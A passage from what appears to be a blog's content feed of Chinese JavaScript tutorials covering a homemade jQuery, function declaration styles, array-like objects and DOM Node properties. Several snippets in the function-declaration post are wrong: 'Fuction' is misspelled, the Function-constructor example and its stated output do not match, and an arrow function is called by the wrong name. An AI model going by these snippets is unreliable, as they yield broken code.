class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="addClass方法"><a href="#addClass方法" class="headerlink" title="addClass方法"></a>addClass方法</h1><p>jQuery的addClass方法，用于为DOM元素添加一个class。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　$(&#x27;body&#x27;).addClass(&#x27;hasJS&#x27;);</span><br></pre></td></tr></table></figure><p>DOM元素本身有一个可读写的className属性，可以用来操作class。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　document.body.className = &#x27;hasJS&#x27;;</span><br><span class="line"></span><br><span class="line">　　// or</span><br><span class="line"></span><br><span class="line">　　document.body.className += &#x27; hasJS&#x27;;</span><br></pre></td></tr></table></figure><p>HTML 5还提供一个classList对象，功能更强大（IE 9不支持）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　document.body.classList.add(&#x27;hasJS&#x27;);</span><br><span class="line"></span><br><span class="line">　　document.body.classList.remove(&#x27;hasJS&#x27;);</span><br><span class="line"></span><br><span class="line">　　document.body.classList.toggle(&#x27;hasJS&#x27;);</span><br><span class="line"></span><br><span class="line">　　document.body.classList.contains(&#x27;hasJS&#x27;);</span><br></pre></td></tr></table></figure><p>自己动手实现addClass方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nodes.addClass = function(classes) &#123;</span><br><span class="line">  for (let i = 0; i &lt; nodes.length;i++) &#123;</span><br><span class="line">    nodes[i].classList.add(classes)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="setText方法"><a href="#setText方法" class="headerlink" title="setText方法"></a>setText方法</h1><p>改变textContent的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nodes.setText = function(text) &#123;</span><br><span class="line">  for (let i = 0; i &lt; nodes.length; i++) &#123;</span><br><span class="line">    nodes[i].textContent = text</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">window.jQuery = function(nodeOrSelector) &#123;</span><br><span class="line">  let nodes = &#123;&#125;</span><br><span class="line">  if (typeof nodeOrSelector === &#x27;string&#x27;) &#123;</span><br><span class="line">    let temp = document.querySelectorAll(nodeOrSelector)</span><br><span class="line">    for (let i = 0; i &lt; temp.length; i++) &#123;</span><br><span class="line">      nodes[i] = temp[i]</span><br><span class="line">    &#125;</span><br><span class="line">    nodes.length = temp.length</span><br><span class="line">  &#125; else if (nodeOrSelector instanceof Node) &#123;</span><br><span class="line">    nodes = &#123;</span><br><span class="line">      0: nodeOrSelector,</span><br><span class="line">      length: 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  nodes.addClass = function(classes) &#123;</span><br><span class="line">    for (let i = 0; i &lt; nodes.length;i++) &#123;</span><br><span class="line">      nodes[i].classList.add(classes)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  nodes.setText = function(text) &#123;</span><br><span class="line">    for (let i = 0; i &lt; nodes.length; i++) &#123;</span><br><span class="line">      nodes[i].textContent = text</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return nodes</span><br><span class="line">&#125;</span><br><span class="line">window.$ = jQuery</span><br><span class="line"></span><br><span class="line">var $div = $(&#x27;div&#x27;)</span><br><span class="line">$div.addClass(&#x27;red&#x27;) // 可将所有 div 的 class 添加一个 red</span><br><span class="line">$div.setText(&#x27;hi&#x27;) // 可将所有 div 的 textContent 变为 hi</span><br></pre></td></tr></table></figure><p><strong>参考资料：阮一峰-<a href="http://www.ruanyifeng.com/blog/2013/05/jquery-free.html">如何做到jQuery</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS函数的五种声明方式</title>
      <link href="/posts/e760f234/"/>
      <url>/posts/e760f234/</url>
      
        <content type="html"><![CDATA[<h1 id="具名函数"><a href="#具名函数" class="headerlink" title="具名函数"></a>具名函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function f(x,y)&#123;return x +y &#125;</span><br></pre></td></tr></table></figure><p>关键字+函数名+参数+{}<br>function 和var意思差不多，表示声明一个特殊的变量（对象）</p><h1 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f = function(x,y)&#123;return x +y &#125;</span><br></pre></td></tr></table></figure><h1 id="给变量赋值一个具名函数"><a href="#给变量赋值一个具名函数" class="headerlink" title="给变量赋值一个具名函数"></a>给变量赋值一个具名函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f = function n(x,y)&#123;return x +y &#125;</span><br></pre></td></tr></table></figure><p><strong>函数n的作用域只限函数内，和具名函数不同，体现了JS的不一致性，不建议使用。</strong></p><h1 id="函数对象"><a href="#函数对象" class="headerlink" title="函数对象"></a>函数对象</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.Fuction函数对象</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Fuction (&#x27;x&#x27;,&#x27;y&#x27;,&#x27;return x + y &#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var n = 1</span><br><span class="line">new Fuction (&#x27;x&#x27;,&#x27;y&#x27;,&#x27;return x&#x27; +n+ &#x27;return y &#x27;)</span><br><span class="line">f(1,2)</span><br><span class="line">//4</span><br><span class="line">//等同于</span><br><span class="line">//new Fuction (&#x27;x&#x27;,&#x27;y&#x27;,&#x27;return x+n+ y&#x27;)</span><br></pre></td></tr></table></figure><h1 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h1><p>箭头函数都是匿名函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=(x,y) =&gt; &#123; return x + y&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sum = (x,y) =&gt; &#123;return x + y&#125;</span><br><span class="line">sum(1,2)</span><br><span class="line">//3</span><br><span class="line">sum(2,4)</span><br><span class="line">//6</span><br></pre></td></tr></table></figure><p>简化  return和{}必须同时省略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sum = (x,y) =&gt; x + y</span><br><span class="line">sum(1,2)</span><br><span class="line">//3</span><br><span class="line">sum(2,4)</span><br><span class="line">//6</span><br></pre></td></tr></table></figure><p>如果只有一个参数的情况下可以这样写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = n =&gt; n*n</span><br><span class="line">n(2)</span><br><span class="line">//4</span><br><span class="line">n(3)</span><br><span class="line">//9</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS的数组与伪数组的区别</title>
      <link href="/posts/4e9a1842/"/>
      <url>/posts/4e9a1842/</url>
      
        <content type="html"><![CDATA[<p>在JavaScript中，除了6种原始数据类型之外，其他所有的都是对象，包括函数（Function）。</p><p>基本数据类型：String,boolean,Number,Undefined, Null,Symbol</p><p>引用数据类型：Object(Array,Date,RegExp,Function)</p><p>在这个前提下，咱们再来讨论JavaScript的对象。</p><h1 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&#125;; //种方式创建对象，被称之为对象直接量（Object Literal）</span><br><span class="line">var obj = new Object(); // 创建一个空对象，和&#123;&#125;一样</span><br></pre></td></tr></table></figure><h1 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var arr = [];//这是使用数组直接量（Array Literal）创建数组</span><br><span class="line">var arr = new Array();//构造函数Array() 创建数组对象</span><br></pre></td></tr></table></figure><h1 id="对象与数组的关系"><a href="#对象与数组的关系" class="headerlink" title="对象与数组的关系"></a>对象与数组的关系</h1><p>在说区别之前，需要先提到另外一个知识，就是JavaScript的原型继承。所有JavaScript的内置构造函数都是继承自 Object.prototype。在这个前提下，可以理解为使用 new Array() 或 [] 创建出来的数组对象，都会拥有 Object.prototype 的属性值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&#125;;// 拥有Object.prototype的属性值</span><br><span class="line">var arr = [];</span><br><span class="line">//使用数组直接量创建的数组，由于Array.prototype的属性继承自 Object.prototype，</span><br><span class="line">//那么，它将同时拥有Array.prototype和Object.prototype的属性值</span><br></pre></td></tr></table></figure><p>可以得到对象和数组的第一个区别：对象没有数组Array.prototype的属性值</p><h1 id="什么是数组"><a href="#什么是数组" class="headerlink" title="什么是数组"></a>什么是数组</h1><p>数组具有一个最基本特征：索引，这是对象所没有的，下面来看一段代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var arr = [];</span><br><span class="line"> </span><br><span class="line">obj[2] = &#x27;a&#x27;;</span><br><span class="line">arr[2] = &#x27;a&#x27;;</span><br><span class="line"> </span><br><span class="line">console.log(obj[2]); // 输出 a</span><br><span class="line">console.log(arr[2]); // 输出 a</span><br><span class="line">console.log(obj.length); // 输出 undefined</span><br><span class="line">console.log(arr.length); // 输出 3</span><br></pre></td></tr></table></figure><p>通过上面这个测试，可以看到，虽然 obj[2]与arr[2] 都输出’a’，但是，在输出length上有明显的差异，这是为什么呢？</p><h2 id="obj-2-与arr-2-的区别"><a href="#obj-2-与arr-2-的区别" class="headerlink" title="obj[2]与arr[2]的区别"></a>obj[2]与arr[2]的区别</h2><ul><li>obj[2]输出’a’，是因为对象就是普通的键值对存取数据</li><li>而arr[2]输出’a’则不同，数组是通过索引来存取数据，arr[2]之所以输出’a’，是因为数组arr索引2的位置已经存储了数据</li></ul><h2 id="obj-length与arr-length的区别"><a href="#obj-length与arr-length的区别" class="headerlink" title="obj.length与arr.length的区别"></a>obj.length与arr.length的区别</h2><ul><li>obj.length并不具有数组的特性，并且obj没有保存属性length，那么自然就会输出undefined</li><li>而对于数组来说，length是数组的一个内置属性，数组会根据索引长度来更改length的值。</li></ul><h2 id="为什么arr-length输出3，而不是1呢？"><a href="#为什么arr-length输出3，而不是1呢？" class="headerlink" title="为什么arr.length输出3，而不是1呢？"></a>为什么arr.length输出3，而不是1呢？</h2><p>这是由于数组的特殊实现机制，对于普通的数组，如果它的索引是从0开始连续的，那么length的值就会等于数组中元素个数</p><p>而对于上面例子中arr，在给数组添加元素时，并没有按照连续的索引添加，所以导致数组的索引不连续，那么就导致索引长度大于元素个数，那么我们称之为稀疏数组。</p><h1 id="伪数组"><a href="#伪数组" class="headerlink" title="伪数组"></a>伪数组</h1><p>定义：</p><ol><li>拥有length属性，其它属性（索引）为非负整数(对象中的索引会被当做字符串来处理，这里你可以当做是个非负整数串来理解)</li><li>不具有数组所具有的方法</li></ol><p>伪数组，就是像数组一样有 length 属性，也有 0、1、2、3 等属性的对象，看起来就像数组一样，但不是数组，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var fakeArray = &#123;</span><br><span class="line">    length: 3,</span><br><span class="line">    &quot;0&quot;: &quot;first&quot;,</span><br><span class="line">    &quot;1&quot;: &quot;second&quot;,</span><br><span class="line">    &quot;2&quot;: &quot;third&quot;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">for (var i = 0; i &lt; fakeArray.length; i++) &#123;</span><br><span class="line">    console.log(fakeArray[i]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Array.prototype.join.call(fakeArray,&#x27;+&#x27;);</span><br></pre></td></tr></table></figure><p>常见的参数的参数 arguments，DOM 对象列表（比如通过 document.getElementsByTags 得到的列表），jQuery 对象（比如 $(“div”)）。</p><p>伪数组是一个 Object，而真实的数组是一个 Array</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fakeArray instanceof Array === false;</span><br><span class="line">Object.prototype.toString.call(fakeArray) === &quot;[object Object]&quot;;</span><br><span class="line"> </span><br><span class="line">var arr = [1,2,3,4,6];</span><br><span class="line">arr instanceof Array === true;</span><br><span class="line">Object.prototype.toString.call(arr) === &quot;[object Array]&quot;</span><br></pre></td></tr></table></figure><p>代码用来判断一个对象是否属于“类数组”。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// Determine if o is an array-like object.</span><br><span class="line">// Strings and functions have numeric length properties, but are</span><br><span class="line">// excluded by the typeof test. In client-side JavaScript, DOM text</span><br><span class="line">// nodes have a numeric length property, and may need to be excluded</span><br><span class="line">// with an additional o.nodeType != 3 test.</span><br><span class="line">function isArrayLike(o) &#123;   </span><br><span class="line">    if (o &amp;&amp;                                // o is not null, undefined, etc.</span><br><span class="line">            typeof o === &#x27;object&#x27; &amp;&amp;            // o is an object</span><br><span class="line">            isFinite(o.length) &amp;&amp;               // o.length is a finite number</span><br><span class="line">            o.length &gt;= 0 &amp;&amp;                    // o.length is non-negative</span><br><span class="line">            o.length===Math.floor(o.length) &amp;&amp;  // o.length is an integer</span><br><span class="line">            o.length &lt; 4294967296)              // o.length &lt; 2^32</span><br><span class="line">            return true;                        // Then o is array-like</span><br><span class="line">    else</span><br><span class="line">            return false;                       // Otherwise it is not</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 不过有个更简单的办法来判断，用 Array.isArray</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Array.isArray(fakeArray) === false;</span><br><span class="line">Array.isArray(arr) === true;</span><br></pre></td></tr></table></figure><p> 从外观上看伪数组，看不出来它与数组的区别，在JavaScript内置对象中常见的伪数组就是大名鼎鼎的auguments：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">  console.log(typeof arguments); // 输出 object，它并不是一个数组</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><p> 另外在DOM对象中，childNodes也是伪数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(typeof document.body.childNodes); // 输出 object</span><br></pre></td></tr></table></figure><p>除此之外，还有很多常用的伪数组，就不一一列举。</p><p>伪数组存在的意义，是可以让普通的对象也能正常使用数组的很多算法，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var arr = Array.prototype.slice.call(arguments)</span><br><span class="line"> </span><br><span class="line">或者</span><br><span class="line">var arr = Array.prototype.slice.call(arguments, 0); // 将arguments对象转换成一个真正的数组</span><br><span class="line"> </span><br><span class="line">Array.prototype.forEach.call(arguments, function(v) &#123;</span><br><span class="line">  // 循环arguments对象</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p> 除了使用 Array.prototype.slice.call(arguments)，你也可以简单的使用[].slice.call(arguments) 来代替。另外，你可以使用 bind 来简化该过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var unboundSlice = Array.prototype.slice;</span><br><span class="line">var slice = Function.prototype.call.bind(unboundSlice);</span><br><span class="line"> </span><br><span class="line">function list() &#123;</span><br><span class="line">  return slice(arguments);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var list1 = list(1, 2, 3); // [1, 2, 3]</span><br></pre></td></tr></table></figure><p>将具有length属性的对象转换成数组对象，arguments是每个函数在运行的时候自动获得的一个近似数组的对象（传入函数的参数从0开始按数字排列，而且有length）。</p><p>比如当你 func(‘a’, ‘b’, ‘c’) 的时候，func里面获得的arguments[0] 是 ‘a’，arguments[1] 是 ‘b’，依次类推。但问题在于这个arguments对象其实并不是Array，所以没有slice方法。Array.prototype.slice.call( )可以间接对其实现slice的效果，而且返回的结果是真正的Array。</p><p>对于IE9以前的版本(DOM实现基于COM)，我们可以使用makeArray来实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 伪数组转化成数组</span><br><span class="line">var makeArray = function(obj) &#123;   </span><br><span class="line">    if (!obj || obj.length === 0) &#123;       </span><br><span class="line">        return [];</span><br><span class="line">    &#125;   </span><br><span class="line">    // 非伪类对象，直接返回最好</span><br><span class="line">    if (!obj.length) &#123;       </span><br><span class="line">        return obj;</span><br><span class="line">    &#125;   </span><br><span class="line">    // 针对IE8以前 DOM的COM实现</span><br><span class="line">    try &#123;       </span><br><span class="line">        return [].slice.call(obj);</span><br><span class="line">    &#125; catch (e) &#123;       </span><br><span class="line">        var i = 0,</span><br><span class="line">            j = obj.length,</span><br><span class="line">            res = [];       </span><br><span class="line">        for (; i &lt; j; i++) &#123;</span><br><span class="line">            res.push(obj[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对象没有数组Array.prototype的属性值，类型是Object，而数组类型是Array；</p><p>数组是基于索引的实现，length会自动更新，而对象是键值对；</p><p>使用对象可以创建伪数组，伪数组可以正常使用数组的大部分方法；</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见DOM以及API总结</title>
      <link href="/posts/bb0f4488/"/>
      <url>/posts/bb0f4488/</url>
      
        <content type="html"><![CDATA[<h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><p>DOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用脚本进行各种操作（比如增删内容）。</p><p>浏览器会根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，再由这些节点组成一个树状结构（DOM Tree）。所有的节点和最终的树状结构，都有规范的对外接口。</p><p>DOM 只是一个接口规范，可以用各种语言实现。所以严格地说，DOM 不是 JavaScript 语法的一部分，但是 DOM 操作是 JavaScript 最常见的任务，离开了 DOM，JavaScript 就无法控制网页。另一方面，JavaScript 也是最常用于 DOM 操作的语言。后面介绍的就是 JavaScript 对 DOM 标准的实现和用法。</p><h1 id="Node-接口"><a href="#Node-接口" class="headerlink" title="Node 接口"></a>Node 接口</h1><h2 id="Node-prototype-nodeType"><a href="#Node-prototype-nodeType" class="headerlink" title="Node.prototype.nodeType"></a>Node.prototype.nodeType</h2><p>nodeType属性返回一个整数值，表示节点的类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.nodeType // 9</span><br></pre></td></tr></table></figure><p>上面代码中，文档节点的类型值为9。</p><p>Node 对象定义了几个常量，对应这些类型值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.nodeType === Node.DOCUMENT_NODE // true</span><br></pre></td></tr></table></figure><p>上面代码中，文档节点的nodeType属性等于常量Node.DOCUMENT_NODE。</p><p>不同节点的nodeType属性值和对应的常量如下。</p><ul><li>文档节点（document）：9，对应常量Node.DOCUMENT_NODE</li><li>元素节点（element）：1，对应常量Node.ELEMENT_NODE</li><li>属性节点（attr）：2，对应常量Node.ATTRIBUTE_NODE</li><li>文本节点（text）：3，对应常量Node.TEXT_NODE</li><li>文档片断节点（DocumentFragment）：11，对应常量Node.DOCUMENT_FRAGMENT_NODE</li><li>文档类型节点（DocumentType）：10，对应常量Node.DOCUMENT_TYPE_NODE</li><li>注释节点（Comment）：8，对应常量Node.COMMENT_NODE<br>确定节点类型时，使用nodeType属性是常用方法。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var node = document.documentElement.firstChild;</span><br><span class="line">if (node.nodeType === Node.ELEMENT_NODE) &#123;</span><br><span class="line">  console.log(&#x27;该节点是元素节点&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Node-prototype-nodeName"><a href="#Node-prototype-nodeName" class="headerlink" title="Node.prototype.nodeName"></a>Node.prototype.nodeName</h2><p>nodeName属性返回节点的名称。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML 代码如下</span><br><span class="line">// &lt;div id=&quot;d1&quot;&gt;hello world&lt;/div&gt;</span><br><span class="line">var div = document.getElementById(&#x27;d1&#x27;);</span><br><span class="line">div.nodeName // &quot;DIV&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，元素节点<div>的nodeName属性就是大写的标签名DIV。</p><p>不同节点的nodeName属性值如下。</p><ul><li>文档节点（document）：#document</li><li>元素节点（element）：大写的标签名</li><li>属性节点（attr）：属性的名称</li><li>文本节点（text）：#text</li><li>文档片断节点（DocumentFragment）：#document-fragment</li><li>文档类型节点（DocumentType）：文档的类型</li><li>注释节点（Comment）：#comment</li></ul><h2 id="Node-prototype-nodeValue"><a href="#Node-prototype-nodeValue" class="headerlink" title="Node.prototype.nodeValue"></a>Node.prototype.nodeValue</h2><p>nodeValue属性返回一个字符串，表示当前节点本身的文本值，该属性可读写。</p><p>只有文本节点（text）、注释节点（comment）和属性节点（attr）有文本值，因此这三类节点的nodeValue可以返回结果，其他类型的节点一律返回null。同样的，也只有这三类节点可以设置nodeValue属性的值，其他类型的节点设置无效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// HTML 代码如下</span><br><span class="line">// &lt;div id=&quot;d1&quot;&gt;hello world&lt;/div&gt;</span><br><span class="line">var div = document.getElementById(&#x27;d1&#x27;);</span><br><span class="line">div.nodeValue // null</span><br><span class="line">div.firstChild.nodeValue // &quot;hello world&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，div是元素节点，nodeValue属性返回null。div.firstChild是文本节点，所以可以返回文本值。</p><h2 id="Node-prototype-textContent"><a href="#Node-prototype-textContent" class="headerlink" title="Node.prototype.textContent"></a>Node.prototype.textContent</h2><p>textContent属性返回当前节点和它的所有后代节点的文本内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// HTML 代码为</span><br><span class="line">// &lt;div id=&quot;divA&quot;&gt;This is &lt;span&gt;some&lt;/span&gt; text&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">document.getElementById(&#x27;divA&#x27;).textContent</span><br><span class="line">// This is some text</span><br></pre></td></tr></table></figure><p>textContent属性自动忽略当前节点内部的 HTML 标签，返回所有文本内容。</p><p>该属性是可读写的，设置该属性的值，会用一个新的文本节点，替换所有原来的子节点。它还有一个好处，就是自动对 HTML 标签转义。这很适合用于用户提供的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&#x27;foo&#x27;).textContent = &#x27;&lt;p&gt;GoodBye!&lt;/p&gt;&#x27;;</span><br></pre></td></tr></table></figure><p>上面代码在插入文本时，会将<p>标签解释为文本，而不会当作标签处理。</p><p>对于文本节点（text）、注释节点（comment）和属性节点（attr），textContent属性的值与nodeValue属性相同。对于其他类型的节点，该属性会将每个子节点（不包括注释节点）的内容连接在一起返回。如果一个节点没有子节点，则返回空字符串。</p><p>文档节点（document）和文档类型节点（doctype）的textContent属性为null。如果要读取整个文档的内容，可以使用document.documentElement.textContent。</p><h2 id="Node-prototype-baseURI"><a href="#Node-prototype-baseURI" class="headerlink" title="Node.prototype.baseURI"></a>Node.prototype.baseURI</h2><p>baseURI属性返回一个字符串，表示当前网页的绝对路径。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为只读。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 当前网页的网址为</span><br><span class="line">// http://www.example.com/index.html</span><br><span class="line">document.baseURI</span><br><span class="line">// &quot;http://www.example.com/index.html&quot;</span><br></pre></td></tr></table></figure><p>如果无法读到网页的 URL，baseURI属性返回null。</p><p>该属性的值一般由当前网址的 URL（即window.location属性）决定，但是可以使用 HTML 的<base>标签，改变该属性的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 